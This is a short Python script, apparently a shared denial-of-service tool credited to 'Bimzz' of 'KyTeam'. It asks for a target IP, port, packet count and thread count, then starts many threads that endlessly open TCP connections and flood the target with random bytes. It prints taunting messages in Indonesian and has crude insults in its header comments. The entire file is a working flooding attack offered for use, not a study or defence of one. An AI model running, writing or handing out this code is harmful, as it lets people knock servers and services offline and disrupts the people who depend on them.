# RECODE ANAK HARAM + JADI YATIM + MISKIN !!
# CODE BY BIMZZ

#IMPORT
import random
import socket
import threading

#UBAH AUTHOR YATIM
print("------------------------------------------------")
print("[+] Discord : KyBimzZ  び#1716")
print("[+] YouTube : Bimzz")
print("[+] Author : Bimzz x KyTeam")
print("[+] KyTeam : https://discord.gg/YMT9utYW5U")
print("------------------------------------------------")

ip = str(input("[Bimzz] IP TARGET : "))
port = int(input("[Bimzz] IP TARGET : "))
times = int(input("[Bimzz] PACKETS : "))
threads = int(input("[Bimzz] THREADS (9024) : "))

def run():
    data = random._urandom(9024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Attacking By Bimzz To IP => ",ip," PORT : ",port," !")
        except socket.error:
            s.close()
            print("[!] Down Yah? Awokswoksawoks Cuakzz..")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
